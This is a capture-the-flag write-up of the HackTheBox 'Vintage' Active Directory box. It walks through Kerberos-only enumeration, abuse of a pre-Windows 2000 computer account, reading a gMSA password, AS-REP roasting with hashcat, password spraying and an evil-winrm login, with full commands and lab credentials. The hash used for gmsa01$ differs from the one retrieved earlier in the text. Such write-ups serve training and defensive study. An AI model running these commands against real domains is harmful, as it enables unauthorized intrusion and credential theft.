+++
title = "HTB - Vintage"
date = "2025-04-26"
author = "Brainmoustache"
authorTwitter = "Brainmoustache"
cover = ""
tags = ["resume", "hackthebox", "Vintage"]
keywords = ["active-directory", ""]
description = "Resume of Vintage from HackTheBox"
showFullContent = false
readingTime = true
hideComments = false
color = "blue"
+++

# HTB - Vintage

## Enumeration:
Nmap
```bash
Nmap scan report for 10.129.231.205
Host is up (0.025s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-14 01:37:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         Microsoft Windows RPC
50623/tcp open  msrpc         Microsoft Windows RPC
50639/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-14T01:38:09
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 199.80 seconds
```

## User exploit
This box start in an assumed breach scenario. Credentials provided are `P.Rosa:Rosaisbest123`.

One of the first thing we could try is to get information about the target.

`nxc smb 10.129.231.205 -u P.Rosa -p Rosaisbest123`
```bash
SMB         10.129.231.205  445    10.129.231.205   [*]  x64 (name:10.129.231.205) (domain:10.129.231.205) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.231.205  445    10.129.231.205   [-] 10.129.231.205\P.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED 
```
We see that we get an error stating `STATUS_NOT_SUPPORTED` but also `NTLM:False`. 

It means we won't be able to use NTLM for this box but only Kerberos.

We can confirm by searching the SASL mechanism supported with `ldapsearch`.

> Simple Authentication and Security Layer (SASL) is a framework for authentication and data security in internet protocols.
> 
> Active Directory supports multiple SASL mechanisms for LDAP bind request.
> 
> GSS-SPNEGO normally supports both Kerberos and NTLM. In this case, only Kerberos is available.

`ldapsearch -x -H ldap://10.129.231.205 -b "" -s base "objectclass=*" supportedSASLMechanisms`
```bash
dn:
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
```
You can also use nmap to do the same `nmap -p 389 --script ldap-rootdse <host>`

We can confirm the usage of Kerberos by requesting a ticket granting ticket and using it with impacket to retrieve a list of domain users
```bash
impacket-getTGT 'VINTAGE.HTB'/'P.Rosa' -dc-ip 10.129.231.205

export KRB5CCNAME=/home/brainmoustache/hackthebox/vintage/P.Rosa.ccache

impacket-GetADUsers -all -k -no-pass -dc-ip 10.129.231.205 -all -dc-host dc01.vintage.htb vintage.htb/
```
With the last command, we get the following result
```bash
[*] Querying dc01.vintage.htb for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2024-06-08 07:34:54.403955  2025-04-23 08:12:01.460517 
Guest                                                 2024-11-13 09:16:53.833292  2024-06-07 03:52:40.153707 
krbtgt                                                2024-06-05 06:27:35.400481  <never>             
M.Rossi                                               2024-06-05 09:31:08.094234  <never>             
R.Verdi                                               2024-06-05 09:31:08.141099  <never>             
L.Bianchi                                             2024-06-05 09:31:08.172305  <never>             
G.Viola                                               2024-06-05 09:31:08.203614  <never>             
C.Neri                                                2024-06-05 17:08:13.504719  2024-06-08 08:51:15.053249 
P.Rosa                                                2024-11-06 07:27:16.968169  2025-04-23 08:24:50.913605 
svc_sql                                               2025-04-23 08:12:12.710462  <never>             
svc_ldap                                              2024-06-06 09:45:27.881830  <never>             
svc_ark                                               2024-06-06 09:45:27.913095  <never>             
C.Neri_adm                                            2024-06-07 06:54:14.001771  2024-06-07 10:06:11.244607 
L.Bianchi_adm                                         2025-04-23 07:57:59.929245  <never>             
```
Quickly analyzing this output reveals that we are going to target at some point users `C.Neri` and `C.Neri_adm`.

With the credential for `P.Rosa`, we can now run bloodhound with `nxc`

`nxc ldap 10.129.231.205 -d vintage.htb --use-kcache -k --dns-server 10.129.231.205 --bloodhound --collection All`

`-k --use-kcache` and mandatory when using kerberos ticket with `nxc`

Looking at what we have access with P.Rosa, we do not find much.

Keeping in mind the name of the box `Vintage`, we can discover an old behavior of Windows.

![](/content/img/htb/vintage/bloodhound_fs01-memberof.png)

`FS01$` computer account is member of `PRE-WINDOWS 2000 COMPATIBLE ACCESS@VINTAGE.HTB` group.

> When a new computer account is configured as "pre-Windows 2000 computer", its password is set based on its name (i.e. lowercase computer name without the trailing `$`). When it isn't, the password is randomly generated. ([ref](https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers)).
> 
>Once an authentication occurs for a pre-Windows 2000 computer, according to [TrustedSec's blogpost](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/), its password will usually need to be changed.

Based on the latest information, we can try to fetch a new kerberos service ticket with credentials `FS01$:fs01`
```bash
impacket-getTGT 'VINTAGE.HTB'/'FS01$' -dc-ip 10.129.231.205    
password: fs01
```

Using this computer account and searching in bloodhound, we discover a new privilege.

`FS01.VINTAGE.HTB` is member of `DOMAIN COMPUTERS@VINTAGE.HTB`

![](/content/img/htb/vintage/bloodhound_fs01_memberof.png)

`DOMAIN COMPUTERS@VINTAGE.HTB` can `ReadGMSAPassword` of `GMSA01$@VINTAGE.HTB`.

![](/content/img/htb/vintage/bloodhound_domaincomputer_readgmsapassword.png)

> A Group Managed Service Account (gMSA) is a type of service account in Windows Server that is specifically designed to provide better management, security, and access control for services, tasks, and applications that run on multiple servers. gMSA accounts are considered like Computer account. ([ref](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-managed-service-accounts/group-managed-service-accounts/group-managed-service-accounts-overview))

There are multiple way to read the `GMSA` account password. Here is the command with `bloodyAD`. 
```bash
export KRB5CCNAME=/home/brainmoustache/hackthebox/vintage/FS01$.ccache
python3 bloodyAD.py -k --dc-ip 10.129.231.205 --host dc01.vintage.htb -d vintage.htb get object 'GMSA01$' --attr msDS-ManagedPassword
```
Result of the command
```bash
distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:7dc430b95e17ed6f817f69366f35be06
msDS-ManagedPassword.B64ENCODED: sfyyjet8CbAO5HFzqbtcCtYlqyYohprMvCgeztWhv4z/WOQOS1zcslIn9C3K/ucxzjDGRgHJS/1a54nxI0DxzlhZElfBxQL2z0KpRCrUNdKbdHXU/kzFj/i38JFgOWrx2FMIGKrEEIohO3b2fA/U/vlPxw65M+kY2krLxl5tfD1Un1kMCByA1AI4VuR5zxXSfpnzFIxKlo1PKBJUxttMqbRM21I5/aLQnaIDCnr3WaqfU6lLwdGWxoz6XSD3UiqLaW5iDPYYR47kJpnflJgS0TBUBkvd2JiLiOb5CXF1gBgUsbVLtBo/OWW/+lrvEpBtS7QIUFsOKMIaNsKFGtTkWQ==
```
`GMSA01$@VINTAGE.HTB` account has `AddSelf` and `GenericWrite` on `SERVICEMANAGERS@VINTAGE.HTB` group.

![](/content/img/htb/vintage/bloodhound_gmsa01_addself.png)

Adding the computer account into  the group
```bash
impacket-getTGT 'VINTAGE.HTB'/'gmsa01$' -dc-ip 10.129.231.205 -hashes 'aad3b435b51404eeaad3b435b51404ee:cfa9f6edd15de88ae7a9652114e3f4a7'

export KRB5CCNAME=/home/brainmoustache/hackthebox/vintage/gmsa01$.ccache

python3 bloodyAD.py --dc-ip 10.129.231.205 --host dc01.vintage.htb -d vintage.htb -k add groupMember "SERVICEMANAGERS" "gMSA01$"


[+] gMSA01$ added to SERVICEMANAGERS
```

`SERVICEMANAGERS@VINTAGE.HTB` has `GenericAll` on 3 service accounts
- SVC_ARK@VINTAGE.HTB
- SVC_SQL@VINTAGE.HTB
- SVC_LDAP@VINTAGE.HTB

![alt text](/content/img/htb/vintage/bloodhound_servicemanagers_genericall.png)

**Since GMSA accounts are considered like Computer account, we must find another account to do the next step. 

We will use the `P.Rosa` one. The idea here is to make the 3 service accounts vulnerable to ASREP-ROAST attack.

`SVC_SQL@VINTAGE.HTB`  is disabled. We must first make sure it's enable.

```bash
# Adding P.Rosa to servicemanagers group
export KRB5CCNAME=/home/brainmoustache/hackthebox/vintage/gmsa01$.ccache
python3 bloodyAD.py --dc-ip 10.129.231.205 --host dc01.vintage.htb -d vintage.htb -k add groupMember 'SERVICEMANAGERS' P.Rosa

# Getting TGT for P.Rosa account
impacket-getTGT 'VINTAGE.HTB'/'P.Rosa' -dc-ip 10.129.231.205
export KRB5CCNAME=/home/brainmoustache/hackthebox/vintage/P.Rosa.ccache

# Enabling the svc_sql account
venv/bin/python3.12 bloodyAD.py -v DEBUG --dc-ip 10.129.231.205 --host dc01.vintage.htb -d vintage.htb -k remove uac svc_sql -f LOCKOUT -f ACCOUNTDISABLE

> [-] ['LOCKOUT', 'ACCOUNTDISABLE'] property flags removed from svc_sql userAccountControl

# Setting ASREP-ROAST on all 3 service accounts
venv/bin/python3.12 bloodyAD.py -v DEBUG --dc-ip 10.129.231.205 --host dc01.vintage.htb -d vintage.htb -k add uac svc_ldap -f DONT_REQ_PREAUTH
venv/bin/python3.12 bloodyAD.py -v DEBUG --dc-ip 10.129.231.205 --host dc01.vintage.htb -d vintage.htb -k add uac svc_sql -f DONT_REQ_PREAUTH
venv/bin/python3.12 bloodyAD.py -v DEBUG --dc-ip 10.129.231.205 --host dc01.vintage.htb -d vintage.htb -k add uac svc_ark -f DONT_REQ_PREAUTH

# Getting hash
impacket-GetNPUsers vintage.htb/ -usersfile users -format hashcat -outputfile hashes.asreproast -dc-ip 10.129.231.205

# Cracking using hashcat
hashcat.exe -m 18200 hashes.txt wordlists/rockyou.txt
$krb5asrep$23$svc_sql@VINTAGE.HTB:27d4e458c1174045d21621dd6d9fdf14$0d268da4385bc8951254baf4068b543a6ad66e50db44b8bcbd6b0ac4ca129d290a4777277925a5d5aa47b7c22c5990718d6fc1ba388dbf6ddd6883c9aae112b03f6efa160b8302662fb198e5e896a669c4317593d86a9f0ef857bba70f11e039fb421cec28e665b71a03472073ad61c7153602081fb4f476416ea955714dd2ce315439bb010373c3d1ee7ee5e35b00a5f4373c9d6f259dade94b6cc73abb15d87e6639703c80b14fac627b4ceffc738c7e6ef2e15fca1211669398a317858a5dadeae9c8b0f296dcd857389aab0ea5fb33404d766c59ca014893d9860573dce6e7026d67f53c14c3251d:Zer0the0ne
```
We found a password `Zer0the0ne` for the disabled account. Let's try to password spray to find password reuse.
```bash
# Password spray using kerberos
./kerbrute passwordspray domain_users 'Zer0the0ne' --dc 10.129.231.205 -d vintage.htb


2025/02/03 21:17:00 >  [+] VALID LOGIN:  C.Neri@vintage.htb:Zer0the0ne
```
Getting a TGT to connect to the box
```bash
impacket-getTGT 'VINTAGE.HTB'/'C.Neri' -dc-ip 10.129.231.205
export KRB5CCNAME=/home/brainmoustache/hackthebox/vintage/C.Neri.ccache

evil-winrm -i dc01.vintage.htb -r vintage.htb
```
To properly connect using Kerberos with evil-winrm, configured the file `/etc/krb5.conf` with this configuration.
```bash
[libdefaults]
        default_realm = vintage.htb

# The following krb5.conf variables are only for MIT Kerberos.
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
        rdns = false


# The following libdefaults parameters are only for Heimdal Kerberos.
        fcc-mit-ticketflags = true

[realms]
        VINTAGE.HTB = {
                kdc = dc01.vintage.htb
                admin_server = dc01.vintage.htb
                default_domain = VINTAGE.HTB
        }

[domain_realm]
        .vintage.htb = VINTAGE.HTB
```
Also, make sure you properly configure the `/etc/hosts` with the following
```bash
10.129.231.205 vintage.htb dc01.vintage.htb
```


Read the flag
```bash
*Evil-WinRM* PS C:\Users\C.Neri> type Desktop/user.txt
``` 

## Root exploit
- Reading DPAPI secret from the user
- Pivot into c.neri_adm
- S4U2SELF attack
1. Add the user svc_sql into the groupd that we just got `GenericWrite` access to `DelegatedAdmins`.
2. We use this account because C.Neri have `GenericAll` on it. We will be able to add an SPN.
3. Using previously added SPN, we will be able to fetch a TGS and impersonate the user `L.BIANCHI_ADM`


___
## Resources:

| Hyperlink                                                                                                                                                                    | Info                                      |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------- |
| https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/989e0748-0953-455d-9d37-d08dfbf3998b                                                                   | SASL Authentication                       |
| https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e1cbe214-d73b-4c58-aad2-bee399ccdfb8                                                                   | 3.1.1.3.4.5.2 GSS-SPNEGO                  |
| https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers                                                                                                | Pre-Windows 2000 computers                |
| https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/                                                                                                   | Diving into pre created computer accounts |
| https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-managed-service-accounts/group-managed-service-accounts/group-managed-service-accounts-overview | Group Managed Service Accounts Overview   |
|                                                                                                                                                                              |                                           |
|                                                                                                                                                                              |                                           |





